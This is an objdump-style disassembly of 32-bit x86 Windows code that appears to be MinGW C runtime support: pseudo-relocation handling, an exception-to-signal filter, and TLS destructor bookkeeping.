  405ffd:	83 c0 0c             	add    $0xc,%eax
  406000:	8b 10                	mov    (%eax),%edx
  406002:	39 da                	cmp    %ebx,%edx
  406004:	77 0a                	ja     0x406010
  406006:	8b 78 04             	mov    0x4(%eax),%edi
  406009:	03 57 08             	add    0x8(%edi),%edx
  40600c:	39 d3                	cmp    %edx,%ebx
  40600e:	72 7f                	jb     0x40608f
  406010:	83 c1 01             	add    $0x1,%ecx
  406013:	83 c0 14             	add    $0x14,%eax
  406016:	39 f1                	cmp    %esi,%ecx
  406018:	75 e6                	jne    0x406000
  40601a:	89 1c 24             	mov    %ebx,(%esp)
  40601d:	e8 2e 09 00 00       	call   0x406950
  406022:	89 c7                	mov    %eax,%edi
  406024:	85 c0                	test   %eax,%eax
  406026:	0f 84 db 00 00 00    	je     0x406107
  40602c:	a1 a0 93 40 00       	mov    0x4093a0,%eax
  406031:	8d 1c b6             	lea    (%esi,%esi,4),%ebx
  406034:	c1 e3 02             	shl    $0x2,%ebx
  406037:	01 d8                	add    %ebx,%eax
  406039:	89 78 10             	mov    %edi,0x10(%eax)
  40603c:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  406042:	e8 19 0a 00 00       	call   0x406a60
  406047:	8b 15 a0 93 40 00    	mov    0x4093a0,%edx
  40604d:	03 47 0c             	add    0xc(%edi),%eax
  406050:	89 44 1a 0c          	mov    %eax,0xc(%edx,%ebx,1)
  406054:	8d 54 24 14          	lea    0x14(%esp),%edx
  406058:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  40605f:	00 
  406060:	89 54 24 04          	mov    %edx,0x4(%esp)
  406064:	89 04 24             	mov    %eax,(%esp)
  406067:	ff 15 6c a2 40 00    	call   *0x40a26c
  40606d:	83 ec 0c             	sub    $0xc,%esp
  406070:	85 c0                	test   %eax,%eax
  406072:	74 73                	je     0x4060e7
  406074:	8b 44 24 28          	mov    0x28(%esp),%eax
  406078:	8d 50 c0             	lea    -0x40(%eax),%edx
  40607b:	83 e2 bf             	and    $0xffffffbf,%edx
  40607e:	74 08                	je     0x406088
  406080:	83 e8 04             	sub    $0x4,%eax
  406083:	83 e0 fb             	and    $0xfffffffb,%eax
  406086:	75 0e                	jne    0x406096
  406088:	83 05 9c 93 40 00 01 	addl   $0x1,0x40939c
  40608f:	83 c4 30             	add    $0x30,%esp
  406092:	5b                   	pop    %ebx
  406093:	5e                   	pop    %esi
  406094:	5f                   	pop    %edi
  406095:	c3                   	ret
  406096:	8b 44 24 14          	mov    0x14(%esp),%eax
  40609a:	8b 54 24 20          	mov    0x20(%esp),%edx
  40609e:	03 1d a0 93 40 00    	add    0x4093a0,%ebx
  4060a4:	89 43 04             	mov    %eax,0x4(%ebx)
  4060a7:	89 53 08             	mov    %edx,0x8(%ebx)
  4060aa:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4060ae:	c7 44 24 08 40 00 00 	movl   $0x40,0x8(%esp)
  4060b5:	00 
  4060b6:	89 54 24 04          	mov    %edx,0x4(%esp)
  4060ba:	89 04 24             	mov    %eax,(%esp)
  4060bd:	ff 15 68 a2 40 00    	call   *0x40a268
  4060c3:	83 ec 10             	sub    $0x10,%esp
  4060c6:	85 c0                	test   %eax,%eax
  4060c8:	75 be                	jne    0x406088
  4060ca:	ff 15 30 a2 40 00    	call   *0x40a230
  4060d0:	c7 04 24 30 83 40 00 	movl   $0x408330,(%esp)
  4060d7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4060db:	e8 a0 fe ff ff       	call   0x405f80
  4060e0:	31 f6                	xor    %esi,%esi
  4060e2:	e9 33 ff ff ff       	jmp    0x40601a
  4060e7:	a1 a0 93 40 00       	mov    0x4093a0,%eax
  4060ec:	8b 44 18 0c          	mov    0xc(%eax,%ebx,1),%eax
  4060f0:	89 44 24 08          	mov    %eax,0x8(%esp)
  4060f4:	8b 47 08             	mov    0x8(%edi),%eax
  4060f7:	c7 04 24 fc 82 40 00 	movl   $0x4082fc,(%esp)
  4060fe:	89 44 24 04          	mov    %eax,0x4(%esp)
  406102:	e8 79 fe ff ff       	call   0x405f80
  406107:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40610b:	c7 04 24 dc 82 40 00 	movl   $0x4082dc,(%esp)
  406112:	e8 69 fe ff ff       	call   0x405f80
  406117:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40611e:	66 90                	xchg   %ax,%ax
  406120:	55                   	push   %ebp
  406121:	89 e5                	mov    %esp,%ebp
  406123:	57                   	push   %edi
  406124:	56                   	push   %esi
  406125:	53                   	push   %ebx
  406126:	83 ec 3c             	sub    $0x3c,%esp
  406129:	a1 98 93 40 00       	mov    0x409398,%eax
  40612e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  406131:	85 c0                	test   %eax,%eax
  406133:	74 0b                	je     0x406140
  406135:	8d 65 f4             	lea    -0xc(%ebp),%esp
  406138:	5b                   	pop    %ebx
  406139:	5e                   	pop    %esi
  40613a:	5f                   	pop    %edi
  40613b:	5d                   	pop    %ebp
  40613c:	c3                   	ret
  40613d:	8d 76 00             	lea    0x0(%esi),%esi
  406140:	c7 05 98 93 40 00 01 	movl   $0x1,0x409398
  406147:	00 00 00 
  40614a:	e8 81 08 00 00       	call   0x4069d0
  40614f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  406152:	8d 04 85 1b 00 00 00 	lea    0x1b(,%eax,4),%eax
  406159:	c1 e8 04             	shr    $0x4,%eax
  40615c:	c1 e0 04             	shl    $0x4,%eax
  40615f:	e8 6c 0a 00 00       	call   0x406bd0
  406164:	c7 05 9c 93 40 00 00 	movl   $0x0,0x40939c
  40616b:	00 00 00 
  40616e:	29 c4                	sub    %eax,%esp
  406170:	8d 44 24 1f          	lea    0x1f(%esp),%eax
  406174:	83 e0 f0             	and    $0xfffffff0,%eax
  406177:	a3 a0 93 40 00       	mov    %eax,0x4093a0
  40617c:	b8 d0 86 40 00       	mov    $0x4086d0,%eax
  406181:	2d d0 86 40 00       	sub    $0x4086d0,%eax
  406186:	83 f8 07             	cmp    $0x7,%eax
  406189:	7e aa                	jle    0x406135
  40618b:	8b 15 d0 86 40 00    	mov    0x4086d0,%edx
  406191:	83 f8 0b             	cmp    $0xb,%eax
  406194:	0f 8f 96 00 00 00    	jg     0x406230
  40619a:	bb d0 86 40 00       	mov    $0x4086d0,%ebx
  40619f:	85 d2                	test   %edx,%edx
  4061a1:	0f 85 8e 01 00 00    	jne    0x406335
  4061a7:	8b 43 04             	mov    0x4(%ebx),%eax
  4061aa:	85 c0                	test   %eax,%eax
  4061ac:	0f 85 83 01 00 00    	jne    0x406335
  4061b2:	8b 43 08             	mov    0x8(%ebx),%eax
  4061b5:	83 f8 01             	cmp    $0x1,%eax
  4061b8:	0f 85 c4 01 00 00    	jne    0x406382
  4061be:	8d 7b 0c             	lea    0xc(%ebx),%edi
  4061c1:	81 ff d0 86 40 00    	cmp    $0x4086d0,%edi
  4061c7:	72 26                	jb     0x4061ef
  4061c9:	e9 67 ff ff ff       	jmp    0x406135
  4061ce:	66 90                	xchg   %ax,%ax
  4061d0:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  4061d3:	03 03                	add    (%ebx),%eax
  4061d5:	89 c6                	mov    %eax,%esi
  4061d7:	89 d8                	mov    %ebx,%eax
  4061d9:	e8 02 fe ff ff       	call   0x405fe0
  4061de:	89 33                	mov    %esi,(%ebx)
  4061e0:	83 c7 0c             	add    $0xc,%edi
  4061e3:	81 ff d0 86 40 00    	cmp    $0x4086d0,%edi
  4061e9:	0f 83 b1 00 00 00    	jae    0x4062a0
  4061ef:	8b 07                	mov    (%edi),%eax
  4061f1:	8b 4f 04             	mov    0x4(%edi),%ecx
  4061f4:	0f b6 57 08          	movzbl 0x8(%edi),%edx
  4061f8:	8d b0 00 00 40 00    	lea    0x400000(%eax),%esi
  4061fe:	8d 99 00 00 40 00    	lea    0x400000(%ecx),%ebx
  406204:	8b 80 00 00 40 00    	mov    0x400000(%eax),%eax
  40620a:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40620d:	83 fa 10             	cmp    $0x10,%edx
  406210:	74 4e                	je     0x406260
  406212:	83 fa 20             	cmp    $0x20,%edx
  406215:	74 b9                	je     0x4061d0
  406217:	83 fa 08             	cmp    $0x8,%edx
  40621a:	0f 84 e0 00 00 00    	je     0x406300
  406220:	89 54 24 04          	mov    %edx,0x4(%esp)
  406224:	c7 04 24 8c 83 40 00 	movl   $0x40838c,(%esp)
  40622b:	e8 50 fd ff ff       	call   0x405f80
  406230:	85 d2                	test   %edx,%edx
  406232:	0f 85 f8 00 00 00    	jne    0x406330
  406238:	a1 d4 86 40 00       	mov    0x4086d4,%eax
  40623d:	89 c7                	mov    %eax,%edi
  40623f:	0b 3d d8 86 40 00    	or     0x4086d8,%edi
  406245:	0f 85 2d 01 00 00    	jne    0x406378
  40624b:	8b 15 dc 86 40 00    	mov    0x4086dc,%edx
  406251:	bb dc 86 40 00       	mov    $0x4086dc,%ebx
  406256:	e9 44 ff ff ff       	jmp    0x40619f
  40625b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40625f:	90                   	nop
  406260:	0f b7 b1 00 00 40 00 	movzwl 0x400000(%ecx),%esi
  406267:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40626a:	89 f1                	mov    %esi,%ecx
  40626c:	81 c9 00 00 ff ff    	or     $0xffff0000,%ecx
  406272:	66 85 f6             	test   %si,%si
  406275:	0f 48 f1             	cmovs  %ecx,%esi
  406278:	2b 75 d4             	sub    -0x2c(%ebp),%esi
  40627b:	83 c7 0c             	add    $0xc,%edi
  40627e:	01 c6                	add    %eax,%esi
  406280:	89 d8                	mov    %ebx,%eax
  406282:	e8 59 fd ff ff       	call   0x405fe0
  406287:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40628a:	66 89 b1 00 00 40 00 	mov    %si,0x400000(%ecx)
  406291:	81 ff d0 86 40 00    	cmp    $0x4086d0,%edi
  406297:	0f 82 52 ff ff ff    	jb     0x4061ef
  40629d:	8d 76 00             	lea    0x0(%esi),%esi
  4062a0:	a1 9c 93 40 00       	mov    0x40939c,%eax
  4062a5:	85 c0                	test   %eax,%eax
  4062a7:	0f 8e 88 fe ff ff    	jle    0x406135
  4062ad:	8b 1d 68 a2 40 00    	mov    0x40a268,%ebx
  4062b3:	8b 7d cc             	mov    -0x34(%ebp),%edi
  4062b6:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  4062b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4062c0:	8b 15 a0 93 40 00    	mov    0x4093a0,%edx
  4062c6:	8d 04 bf             	lea    (%edi,%edi,4),%eax
  4062c9:	8d 04 82             	lea    (%edx,%eax,4),%eax
  4062cc:	8b 10                	mov    (%eax),%edx
  4062ce:	85 d2                	test   %edx,%edx
  4062d0:	74 1a                	je     0x4062ec
  4062d2:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4062d6:	89 54 24 08          	mov    %edx,0x8(%esp)
  4062da:	8b 50 08             	mov    0x8(%eax),%edx
  4062dd:	89 54 24 04          	mov    %edx,0x4(%esp)
  4062e1:	8b 40 04             	mov    0x4(%eax),%eax
  4062e4:	89 04 24             	mov    %eax,(%esp)
  4062e7:	ff d3                	call   *%ebx
  4062e9:	83 ec 10             	sub    $0x10,%esp
  4062ec:	83 c7 01             	add    $0x1,%edi
  4062ef:	3b 3d 9c 93 40 00    	cmp    0x40939c,%edi
  4062f5:	7c c9                	jl     0x4062c0
  4062f7:	8d 65 f4             	lea    -0xc(%ebp),%esp
  4062fa:	5b                   	pop    %ebx
  4062fb:	5e                   	pop    %esi
  4062fc:	5f                   	pop    %edi
  4062fd:	5d                   	pop    %ebp
  4062fe:	c3                   	ret
  4062ff:	90                   	nop
  406300:	0f b6 13             	movzbl (%ebx),%edx
  406303:	89 d6                	mov    %edx,%esi
  406305:	81 ce 00 ff ff ff    	or     $0xffffff00,%esi
  40630b:	84 d2                	test   %dl,%dl
  40630d:	0f 48 d6             	cmovs  %esi,%edx
  406310:	2b 55 d4             	sub    -0x2c(%ebp),%edx
  406313:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406316:	89 d8                	mov    %ebx,%eax
  406318:	e8 c3 fc ff ff       	call   0x405fe0
  40631d:	89 f0                	mov    %esi,%eax
  40631f:	88 03                	mov    %al,(%ebx)
  406321:	e9 ba fe ff ff       	jmp    0x4061e0
  406326:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40632d:	8d 76 00             	lea    0x0(%esi),%esi
  406330:	bb d0 86 40 00       	mov    $0x4086d0,%ebx
  406335:	81 fb d0 86 40 00    	cmp    $0x4086d0,%ebx
  40633b:	0f 83 f4 fd ff ff    	jae    0x406135
  406341:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406348:	8b 73 04             	mov    0x4(%ebx),%esi
  40634b:	8b 3b                	mov    (%ebx),%edi
  40634d:	83 c3 08             	add    $0x8,%ebx
  406350:	03 be 00 00 40 00    	add    0x400000(%esi),%edi
  406356:	8d 86 00 00 40 00    	lea    0x400000(%esi),%eax
  40635c:	e8 7f fc ff ff       	call   0x405fe0
  406361:	89 be 00 00 40 00    	mov    %edi,0x400000(%esi)
  406367:	81 fb d0 86 40 00    	cmp    $0x4086d0,%ebx
  40636d:	72 d9                	jb     0x406348
  40636f:	e9 2c ff ff ff       	jmp    0x4062a0
  406374:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406378:	bb d0 86 40 00       	mov    $0x4086d0,%ebx
  40637d:	e9 28 fe ff ff       	jmp    0x4061aa
  406382:	89 44 24 04          	mov    %eax,0x4(%esp)
  406386:	c7 04 24 58 83 40 00 	movl   $0x408358,(%esp)
  40638d:	e8 ee fb ff ff       	call   0x405f80
  406392:	90                   	nop
  406393:	90                   	nop
  406394:	90                   	nop
  406395:	90                   	nop
  406396:	90                   	nop
  406397:	90                   	nop
  406398:	90                   	nop
  406399:	90                   	nop
  40639a:	90                   	nop
  40639b:	90                   	nop
  40639c:	90                   	nop
  40639d:	90                   	nop
  40639e:	90                   	nop
  40639f:	90                   	nop
  4063a0:	83 ec 3c             	sub    $0x3c,%esp
  4063a3:	a1 a4 93 40 00       	mov    0x4093a4,%eax
  4063a8:	dd 44 24 48          	fldl   0x48(%esp)
  4063ac:	dd 44 24 50          	fldl   0x50(%esp)
  4063b0:	dd 44 24 58          	fldl   0x58(%esp)
  4063b4:	85 c0                	test   %eax,%eax
  4063b6:	74 30                	je     0x4063e8
  4063b8:	d9 ca                	fxch   %st(2)
  4063ba:	8b 54 24 40          	mov    0x40(%esp),%edx
  4063be:	dd 5c 24 18          	fstpl  0x18(%esp)
  4063c2:	dd 5c 24 20          	fstpl  0x20(%esp)
  4063c6:	89 54 24 10          	mov    %edx,0x10(%esp)
  4063ca:	8b 54 24 44          	mov    0x44(%esp),%edx
  4063ce:	dd 5c 24 28          	fstpl  0x28(%esp)
  4063d2:	89 54 24 14          	mov    %edx,0x14(%esp)
  4063d6:	8d 54 24 10          	lea    0x10(%esp),%edx
  4063da:	89 14 24             	mov    %edx,(%esp)
  4063dd:	ff d0                	call   *%eax
  4063df:	eb 0d                	jmp    0x4063ee
  4063e1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4063e8:	dd d8                	fstp   %st(0)
  4063ea:	dd d8                	fstp   %st(0)
  4063ec:	dd d8                	fstp   %st(0)
  4063ee:	83 c4 3c             	add    $0x3c,%esp
  4063f1:	c3                   	ret
  4063f2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4063f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406400:	8b 44 24 04          	mov    0x4(%esp),%eax
  406404:	a3 a4 93 40 00       	mov    %eax,0x4093a4
  406409:	e9 a2 0a 00 00       	jmp    0x406eb0
  40640e:	90                   	nop
  40640f:	90                   	nop
  406410:	53                   	push   %ebx
  406411:	83 ec 18             	sub    $0x18,%esp
  406414:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  406418:	8b 03                	mov    (%ebx),%eax
  40641a:	8b 00                	mov    (%eax),%eax
  40641c:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  406421:	74 1d                	je     0x406440
  406423:	77 5b                	ja     0x406480
  406425:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40642a:	0f 84 db 00 00 00    	je     0x40650b
  406430:	0f 86 8a 00 00 00    	jbe    0x4064c0
  406436:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
  40643b:	83 f8 04             	cmp    $0x4,%eax
  40643e:	77 25                	ja     0x406465
  406440:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  406447:	00 
  406448:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40644f:	e8 dc 09 00 00       	call   0x406e30
  406454:	83 f8 01             	cmp    $0x1,%eax
  406457:	0f 84 f3 00 00 00    	je     0x406550
  40645d:	85 c0                	test   %eax,%eax
  40645f:	0f 85 0b 01 00 00    	jne    0x406570
  406465:	a1 ac 93 40 00       	mov    0x4093ac,%eax
  40646a:	85 c0                	test   %eax,%eax
  40646c:	0f 84 ce 00 00 00    	je     0x406540
  406472:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  406476:	83 c4 18             	add    $0x18,%esp
  406479:	5b                   	pop    %ebx
  40647a:	ff e0                	jmp    *%eax
  40647c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406480:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  406485:	75 79                	jne    0x406500
  406487:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40648e:	00 
  40648f:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  406496:	e8 95 09 00 00       	call   0x406e30
  40649b:	83 f8 01             	cmp    $0x1,%eax
  40649e:	75 bd                	jne    0x40645d
  4064a0:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4064a7:	00 
  4064a8:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4064af:	e8 7c 09 00 00       	call   0x406e30
  4064b4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4064b9:	e9 84 00 00 00       	jmp    0x406542
  4064be:	66 90                	xchg   %ax,%ax
  4064c0:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4064c5:	75 9e                	jne    0x406465
  4064c7:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4064ce:	00 
  4064cf:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4064d6:	e8 55 09 00 00       	call   0x406e30
  4064db:	83 f8 01             	cmp    $0x1,%eax
  4064de:	0f 84 9c 00 00 00    	je     0x406580
  4064e4:	85 c0                	test   %eax,%eax
  4064e6:	0f 84 79 ff ff ff    	je     0x406465
  4064ec:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4064f3:	ff d0                	call   *%eax
  4064f5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4064fa:	eb 46                	jmp    0x406542
  4064fc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406500:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  406505:	0f 85 5a ff ff ff    	jne    0x406465
  40650b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  406512:	00 
  406513:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  40651a:	e8 11 09 00 00       	call   0x406e30
  40651f:	83 f8 01             	cmp    $0x1,%eax
  406522:	74 75                	je     0x406599
  406524:	85 c0                	test   %eax,%eax
  406526:	0f 84 39 ff ff ff    	je     0x406465
  40652c:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  406533:	ff d0                	call   *%eax
  406535:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40653a:	eb 06                	jmp    0x406542
  40653c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406540:	31 c0                	xor    %eax,%eax
  406542:	83 c4 18             	add    $0x18,%esp
  406545:	5b                   	pop    %ebx
  406546:	c2 04 00             	ret    $0x4
  406549:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406550:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  406557:	00 
  406558:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40655f:	e8 cc 08 00 00       	call   0x406e30
  406564:	e8 07 fa ff ff       	call   0x405f70
  406569:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40656e:	eb d2                	jmp    0x406542
  406570:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  406577:	ff d0                	call   *%eax
  406579:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40657e:	eb c2                	jmp    0x406542
  406580:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  406587:	00 
  406588:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  40658f:	e8 9c 08 00 00       	call   0x406e30
  406594:	83 c8 ff             	or     $0xffffffff,%eax
  406597:	eb a9                	jmp    0x406542
  406599:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4065a0:	00 
  4065a1:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  4065a8:	e8 83 08 00 00       	call   0x406e30
  4065ad:	83 c8 ff             	or     $0xffffffff,%eax
  4065b0:	eb 90                	jmp    0x406542
  4065b2:	90                   	nop
  4065b3:	90                   	nop
  4065b4:	90                   	nop
  4065b5:	90                   	nop
  4065b6:	90                   	nop
  4065b7:	90                   	nop
  4065b8:	90                   	nop
  4065b9:	90                   	nop
  4065ba:	90                   	nop
  4065bb:	90                   	nop
  4065bc:	90                   	nop
  4065bd:	90                   	nop
  4065be:	90                   	nop
  4065bf:	90                   	nop
  4065c0:	55                   	push   %ebp
  4065c1:	57                   	push   %edi
  4065c2:	56                   	push   %esi
  4065c3:	53                   	push   %ebx
  4065c4:	83 ec 1c             	sub    $0x1c,%esp
  4065c7:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  4065ce:	ff 15 1c a2 40 00    	call   *0x40a21c
  4065d4:	8b 1d b0 93 40 00    	mov    0x4093b0,%ebx
  4065da:	83 ec 04             	sub    $0x4,%esp
  4065dd:	85 db                	test   %ebx,%ebx
  4065df:	74 34                	je     0x406615
  4065e1:	8b 2d 5c a2 40 00    	mov    0x40a25c,%ebp
  4065e7:	8b 3d 30 a2 40 00    	mov    0x40a230,%edi
  4065ed:	8d 76 00             	lea    0x0(%esi),%esi
  4065f0:	8b 03                	mov    (%ebx),%eax
  4065f2:	89 04 24             	mov    %eax,(%esp)
  4065f5:	ff d5                	call   *%ebp
  4065f7:	83 ec 04             	sub    $0x4,%esp
  4065fa:	89 c6                	mov    %eax,%esi
  4065fc:	ff d7                	call   *%edi
  4065fe:	85 c0                	test   %eax,%eax
  406600:	75 0c                	jne    0x40660e
  406602:	85 f6                	test   %esi,%esi
  406604:	74 08                	je     0x40660e
  406606:	8b 43 04             	mov    0x4(%ebx),%eax
  406609:	89 34 24             	mov    %esi,(%esp)
  40660c:	ff d0                	call   *%eax
  40660e:	8b 5b 08             	mov    0x8(%ebx),%ebx
  406611:	85 db                	test   %ebx,%ebx
  406613:	75 db                	jne    0x4065f0
  406615:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  40661c:	ff 15 44 a2 40 00    	call   *0x40a244
  406622:	83 ec 04             	sub    $0x4,%esp
  406625:	83 c4 1c             	add    $0x1c,%esp
  406628:	5b                   	pop    %ebx
  406629:	5e                   	pop    %esi
  40662a:	5f                   	pop    %edi
  40662b:	5d                   	pop    %ebp
  40662c:	c3                   	ret
  40662d:	8d 76 00             	lea    0x0(%esi),%esi
  406630:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  406635:	85 c0                	test   %eax,%eax
  406637:	75 07                	jne    0x406640
  406639:	c3                   	ret
  40663a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406640:	53                   	push   %ebx
  406641:	83 ec 18             	sub    $0x18,%esp
  406644:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  40664b:	00 
  40664c:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  406653:	e8 20 08 00 00       	call   0x406e78
  406658:	89 c3                	mov    %eax,%ebx
  40665a:	85 c0                	test   %eax,%eax
  40665c:	74 42                	je     0x4066a0
  40665e:	8b 44 24 20          	mov    0x20(%esp),%eax
  406662:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  406669:	89 03                	mov    %eax,(%ebx)
  40666b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40666f:	89 43 04             	mov    %eax,0x4(%ebx)
  406672:	ff 15 1c a2 40 00    	call   *0x40a21c
  406678:	a1 b0 93 40 00       	mov    0x4093b0,%eax
  40667d:	89 1d b0 93 40 00    	mov    %ebx,0x4093b0
  406683:	83 ec 04             	sub    $0x4,%esp
  406686:	89 43 08             	mov    %eax,0x8(%ebx)
  406689:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  406690:	ff 15 44 a2 40 00    	call   *0x40a244
  406696:	31 c0                	xor    %eax,%eax
  406698:	83 ec 04             	sub    $0x4,%esp
  40669b:	83 c4 18             	add    $0x18,%esp
  40669e:	5b                   	pop    %ebx
  40669f:	c3                   	ret
  4066a0:	83 c8 ff             	or     $0xffffffff,%eax
  4066a3:	eb f6                	jmp    0x40669b
  4066a5:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4066ac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4066b0:	53                   	push   %ebx
  4066b1:	83 ec 18             	sub    $0x18,%esp
  4066b4:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  4066b9:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4066bd:	85 c0                	test   %eax,%eax
  4066bf:	75 0f                	jne    0x4066d0
  4066c1:	83 c4 18             	add    $0x18,%esp
  4066c4:	31 c0                	xor    %eax,%eax
  4066c6:	5b                   	pop    %ebx
  4066c7:	c3                   	ret
  4066c8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4066cf:	90                   	nop
  4066d0:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  4066d7:	ff 15 1c a2 40 00    	call   *0x40a21c
  4066dd:	a1 b0 93 40 00       	mov    0x4093b0,%eax
  4066e2:	83 ec 04             	sub    $0x4,%esp
  4066e5:	85 c0                	test   %eax,%eax
  4066e7:	74 27                	je     0x406710
  4066e9:	31 c9                	xor    %ecx,%ecx
  4066eb:	eb 0b                	jmp    0x4066f8
  4066ed:	8d 76 00             	lea    0x0(%esi),%esi
  4066f0:	89 c1                	mov    %eax,%ecx
  4066f2:	85 d2                	test   %edx,%edx
  4066f4:	74 1a                	je     0x406710
  4066f6:	89 d0                	mov    %edx,%eax
  4066f8:	8b 10                	mov    (%eax),%edx
  4066fa:	39 da                	cmp    %ebx,%edx
  4066fc:	8b 50 08             	mov    0x8(%eax),%edx
  4066ff:	75 ef                	jne    0x4066f0
  406701:	85 c9                	test   %ecx,%ecx
  406703:	74 2b                	je     0x406730
  406705:	89 51 08             	mov    %edx,0x8(%ecx)
  406708:	89 04 24             	mov    %eax,(%esp)
  40670b:	e8 50 07 00 00       	call   0x406e60
  406710:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  406717:	ff 15 44 a2 40 00    	call   *0x40a244
  40671d:	31 c0                	xor    %eax,%eax
  40671f:	83 ec 04             	sub    $0x4,%esp
  406722:	83 c4 18             	add    $0x18,%esp
  406725:	5b                   	pop    %ebx
  406726:	c3                   	ret
  406727:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40672e:	66 90                	xchg   %ax,%ax
  406730:	89 15 b0 93 40 00    	mov    %edx,0x4093b0
  406736:	eb d0                	jmp    0x406708
  406738:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40673f:	90                   	nop
  406740:	53                   	push   %ebx
  406741:	83 ec 18             	sub    $0x18,%esp
  406744:	8b 44 24 24          	mov    0x24(%esp),%eax
  406748:	83 f8 02             	cmp    $0x2,%eax
  40674b:	0f 84 bf 00 00 00    	je     0x406810
  406751:	77 25                	ja     0x406778
  406753:	85 c0                	test   %eax,%eax
  406755:	74 51                	je     0x4067a8
  406757:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  40675c:	85 c0                	test   %eax,%eax
  40675e:	74 30                	je     0x406790
  406760:	c7 05 b4 93 40 00 01 	movl   $0x1,0x4093b4
  406767:	00 00 00 
  40676a:	83 c4 18             	add    $0x18,%esp
  40676d:	b8 01 00 00 00       	mov    $0x1,%eax
  406772:	5b                   	pop    %ebx
  406773:	c3                   	ret
  406774:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406778:	83 f8 03             	cmp    $0x3,%eax
  40677b:	75 ed                	jne    0x40676a
  40677d:	a1 b4 93 40 00       	mov    0x4093b4,%eax
  406782:	85 c0                	test   %eax,%eax
  406784:	74 e4                	je     0x40676a
  406786:	e8 35 fe ff ff       	call   0x4065c0
  40678b:	eb dd                	jmp    0x40676a
  40678d:	8d 76 00             	lea    0x0(%esi),%esi
  406790:	c7 04 24 b8 93 40 00 	movl   $0x4093b8,(%esp)
  406797:	ff 15 40 a2 40 00    	call   *0x40a240
  40679d:	83 ec 04             	sub    $0x4,%esp
  4067a0:	eb be                	jmp    0x406760
